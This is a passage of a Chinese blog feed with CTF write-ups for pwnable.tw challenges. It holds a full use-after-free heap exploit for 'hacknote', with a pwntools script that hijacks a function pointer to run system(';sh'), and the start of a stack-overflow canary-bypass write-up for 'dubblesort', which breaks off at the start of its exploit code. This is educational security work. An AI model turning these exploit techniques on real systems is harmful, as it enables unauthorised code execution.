        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ file hacknote</span><br><span class="line">hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped</span><br><span class="line">$ checksec hacknote</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位程序，去符号表</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>经典的菜单题，添加，删除，打印</p><p>在删除的地方并未清空指针数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80487D4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易看出来是一道UAF的题目，漏洞点是存在可以被使用的悬空指针</p><p>但是需要注意的是，删除函数中free了两次，添加新的note时，也存在两次malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ptr[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line"><span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">*(_DWORD *)ptr[i] = sub_804862B;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line"><span class="built_in">size</span> = atoi(&amp;buf);</span><br><span class="line">v0 = ptr[i];</span><br><span class="line">v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br></pre></td></tr></table></figure><p>每个note对于ptr指针数组中的一项，指针指向一个8个字节的空间，前4个字节为一个sub_804862B函数的地址，后4个字节为数据空间的地址。在打印数据时做出如下调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*ptr[v1])(ptr[v1]);</span><br></pre></td></tr></table></figure><p>其中便调用了sub_804862B函数，此函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804862B</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作很奇怪，但这也正是本题的利用思路，存在一个可以通过UAF控制的函数指针。相关数据结构大致结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">                 +--------------------+</span><br><span class="line">                 |                    |</span><br><span class="line">                 |      ptr           |</span><br><span class="line">                 |                    |</span><br><span class="line">                 +---------+----------+</span><br><span class="line">                           |</span><br><span class="line">                           |</span><br><span class="line">                           |</span><br><span class="line">                           |</span><br><span class="line">                           v</span><br><span class="line">                 +---------+----------+--------------------+</span><br><span class="line">                 |                    |                    |</span><br><span class="line">malloc(8)        |    0x0804862b      |  content_addr      |</span><br><span class="line">                 |                    |                    |</span><br><span class="line">                 +---------+----------+-----------------+--+</span><br><span class="line">                           |                            |</span><br><span class="line">                           |                            |</span><br><span class="line">                           |                            |</span><br><span class="line">                           |                            |</span><br><span class="line">                           v                            v</span><br><span class="line">                 +---------+----------+          +------+-------------+</span><br><span class="line">                 |                    |          |                    |</span><br><span class="line">                 |   sub_804862B      |          |   note content     |  malloc(x)</span><br><span class="line">                 |                    |          |                    |</span><br><span class="line">                 |                    |          |                    |</span><br><span class="line">                 |                    |          |                    |</span><br><span class="line">                 |                    |          |                    |</span><br><span class="line">                 |                    |          |                    |</span><br><span class="line">                 +--------------------+          +--------------------+</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><p>这题并没有后门函数，给出了libc，所以首先肯定需要泄露libc基址。</p><p>有两种方式</p><ol><li>申请unsortbin范围的堆块，释放后重新申请到，即可打印出main_arena地址</li><li>puts出got表地址</li></ol><h4 id="unsortbin泄露libc基址"><a href="#unsortbin泄露libc基址" class="headerlink" title="unsortbin泄露libc基址"></a>unsortbin泄露libc基址</h4><p>32位程序最大申请的fastbin的数据大小为60，所以我们申请一个64字节大小，然后free掉，就能让这个堆块加入到unsortbin的链表中。不过在free之前，还需要申请一个堆块，任意大小即可，仅仅是为了将刚才申请的堆块和topchunk隔开，防止合并</p><blockquote><ul><li>如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk</li><li>如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk</li></ul></blockquote><p>这里我们采用32字节的堆块进行隔离，所以步骤如下：</p><ol><li>申请一个64字节的堆块</li><li>申请一个32字节的堆块</li><li>释放第一个堆块</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b000</span></span><br><span class="line">Size: <span class="number">0x11</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b010</span></span><br><span class="line">Size: <span class="number">0x49</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b058</span></span><br><span class="line">Size: <span class="number">0x11</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b068</span></span><br><span class="line">Size: <span class="number">0x29</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b090</span></span><br><span class="line">Size: <span class="number">0x20f71</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x10</span>: <span class="number">0x804b000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x18</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x28</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x38</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x804b010</span> —▸ <span class="number">0xf7fb27b0</span> (main_arena+<span class="number">48</span>) ◂— <span class="number">0x804b010</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>可以看到第二个堆块确实进入到了unsortbin链表中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">8</span>wx <span class="number">0x804b010</span></span><br><span class="line"><span class="number">0x804b010</span>:<span class="number">0x00000000</span><span class="number">0x00000049</span><span class="number">0xf7fb27b0</span><span class="number">0xf7fb27b0</span></span><br><span class="line"><span class="number">0x804b020</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>我们查看内存可以看见这个堆块的fd和bk指向同一个地方，即0xf7fb27b0，这个位置就是位于libc的main_arena结构体中，只需要再次申请64字节的堆块，内容长度不要覆盖bk，然后调用print功能，打印0号或2号，就能把fd和bk的内容打印出来了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b000</span></span><br><span class="line">Size: <span class="number">0x11</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b010</span></span><br><span class="line">Size: <span class="number">0x49</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b058</span></span><br><span class="line">Size: <span class="number">0x11</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b068</span></span><br><span class="line">Size: <span class="number">0x29</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x804b090</span></span><br><span class="line">Size: <span class="number">0x20f71</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> <span class="number">1.</span> Add note          </span><br><span class="line"> <span class="number">2.</span> Delete note       </span><br><span class="line"> <span class="number">3.</span> Print note        </span><br><span class="line"> <span class="number">4.</span> Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :<span class="number">3</span></span><br><span class="line">Index :<span class="number">2</span></span><br><span class="line"></span><br><span class="line">这里出现一些十六进制的乱码就是打印出来的地址，后四个字节就是泄露出来地址</span><br></pre></td></tr></table></figure><h5 id="本地偏移"><a href="#本地偏移" class="headerlink" title="本地偏移"></a>本地偏移</h5><p>vmmap查看libc基址可得</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7dff000</span> <span class="number">0xf7faf000</span> r-xp   <span class="number">1b</span>0000 <span class="number">0</span>      /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</span><br></pre></td></tr></table></figure><p>offset = 0xf7fb27b0 - 0xf7dff000 = 0x1b37b0</p><h5 id="远程偏移"><a href="#远程偏移" class="headerlink" title="远程偏移"></a>远程偏移</h5><p>简单的说，unsortbin距离main_arena的偏移是固定的+0x30，main_arena是堆管理器实现的过程中的一个结构体，位于libc的数据段，可以通过在IDA中观察对应libc的malloc_trim()函数f5后的结果即可获得main_arena距离libc的起始偏移，而不同版本的libc也正是main_arena距离libc的基址偏移是不同的。本题给的libc中找到地址0x1b0780，加上0x30，最终的结果为0x1b07b0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">malloc_trim</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v2; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// et0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v19; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v20; <span class="comment">// [esp+0h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v21; <span class="comment">// [esp+4h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v22; <span class="comment">// [esp+8h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+Ch] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> *v24; <span class="comment">// [esp+10h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_1B0104 &lt; <span class="number">0</span> )</span><br><span class="line">    sub_70F80();</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v24 = &amp;dword_1B0780; <span class="comment">//main_arena地址</span></span><br></pre></td></tr></table></figure><p>malloc.c源码如图</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-hacknote-1.jpg"  alt=""></p><h4 id="puts出got表地址"><a href="#puts出got表地址" class="headerlink" title="puts出got表地址"></a>puts出got表地址</h4><p>这种方式其实就是通过UAF和题目给出的那个怪异的函数指针调用相结合，也就是劫持控制流的方法。首先申请大于最小的fastbin（0xc）的两个note，然后分别释放，因为这里都会malloc出那个数据空间为8个字节的最小堆块，释放后这两块都会加入到fastbin中。然后申请一个8个字节的note，这时就会把刚才释放的两块fastbin给用了，于是原来的第一个fastbin的堆块就完全可控了，show这个堆块的时候就会调用其前四个字节的函数指针，这样就可以泄露GOT地址，进而泄露libc基址了，步骤如下：</p><ol><li>申请2个note，size大于0xc即可</li><li>释放这两个note</li><li>申请8个字节note，内容为p32(0x804862B) + p32(elf.got[‘puts’])</li><li>show(0)</li></ol><h3 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h3><p>刚才通过puts出got表地址泄露出libc基址的方式就是控制流劫持，所以这里我们采用unsortbin泄露基址之后来继续完成控制流劫持。</p><ol><li>继续unsortbin泄露的步骤</li><li>释放掉前两个note</li><li>申请8个字节note，p32(system_addr)+”;sh\x00”</li><li>show(0)</li></ol><p>即可执行<code>system(&quot;&amp;system;sh&quot;)</code>，前面代表了system函数地址，对应到字符串是无意义的，所以前面会执行失败，通过分号之后面的sh，因为是用的system函数，所以”/bin”这个目录是在环境变量中，所以直接执行sh就可以getshell了。</p><blockquote><p>知识点：<a href="https://blog.csdn.net/freedom2028/article/details/7104131" target="_blank" rel="noopener">linux连续执行多条命令</a></p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf = ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"size :"</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">io.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">io.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">io.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">64</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="string">""</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">64</span>,<span class="string">""</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(io.recv(<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>]) - <span class="number">0x1b07b0</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system_addr)+<span class="string">";sh\x00"</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/03/hacknote/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 hacknote</a></li><li><a href="https://www.jianshu.com/p/7904d1edc007" target="_blank" rel="noopener">UAF获取main_arena地址泄露libc基址</a></li><li><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/" target="_blank" rel="noopener">pwnable.tw系列</a></li><li><a href="https://www.sohu.com/a/208707370_354899" target="_blank" rel="noopener">解题思路 | 从一道Pwn题说起</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-dubblesort-保护全开栈溢出</title>
      <link href="2020/10/29/pwnable-tw-dubblesort-%E4%BF%9D%E6%8A%A4%E5%85%A8%E5%BC%80%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>2020/10/29/pwnable-tw-dubblesort-%E4%BF%9D%E6%8A%A4%E5%85%A8%E5%BC%80%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>检查可以发现保护全开</p><p>这题的逻辑很简单，输入姓名，然后输入数据，程序会对数据进行排序然后输出</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>首先是输入姓名的时候，程序通过read来读取name，回车就截断了，并不会在后面添加\x00，但是printf打印信息是通过\x00截断的，也就是说如果输入后如果后面不是\x00，就会接着输出，产生栈内容泄漏。</p><p>然后是在排序的阶段，并没有限制输入数字的数量，所以可以造成栈溢出。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以看到题目中是存在canary的，但是没办法泄漏，那有没有办法能不修改canary同时完成栈溢出呢？</p><p>如果我们输入非法字符例如字母，scanf确实无法读取，但是由于题目中输入流并不会清空，所以非法字符一直会一直留在stdin，这样剩下的scanf读入的都是非法字符，不行</p><p>另一种方案是输入+或-，因为这两个字符可以定义正负数，如果把输入数字替换成这两个符号，读入只会视为无效而不是非法，canary不会被修改。</p><p>经过调试我们可以看到在输入name的第七个栈空间中存放着疑似栈libc地址的内容</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-1.png"  alt=""></p><p>利用vmmap命令进行对照</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-2.png"  alt=""></p><p>可以计算得偏移为 0xf7fb2000 - 0xf7dff000 = 0x1b3000</p><p>但是需要注意的是这里我们使用的是本机上的libc文件</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-3.png"  alt=""></p><p>查看文件可得此偏移地址为 .got.plt</p><p>与题目给的文件进行对照，发现服务器上的偏移应为0x1b0000</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-4.png"  alt=""></p><p>而同样我们可以在这个libc文件内找到system的偏移及/bin/sh的偏移</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-5.png"  alt=""></p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-6.png"  alt=""></p><p>libc_addr = leak_addr - 0x1b0000</p><p>system_addr = libc_addr + 0x3a940</p><p>binsh_addr = libc_addr + 0x158e8b</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>需要注意的是该栈单元的数据的第一个字节（即.got.plt节地址的最后一个字节，因为小端序）总为0x00，因此若要泄露该数据，需要多发送一个字节覆盖掉0x00，否则printf会将0x00之后的数据截断。可以发送’A’*24+’\n’来泄露出该数据的后三个字节，再加上’\x00’即可。</p><p>然后程序中的排序函数会对栈中内容进行修改，我们需要在输入数据时注意数据的大小，以保证canary地址不会改变，我们可以将canary之前的数据都置0，canary和返回地址之间（包括返回地址）的数据都写入system函数的地址，从而保证exp大概率可以执行成功</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-7.png"  alt=""></p><p>最后需要输入的是35个数</p><p>24 * ‘0’ + ‘+’ + 9 * system_addr(调试得知) + binshaddr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span 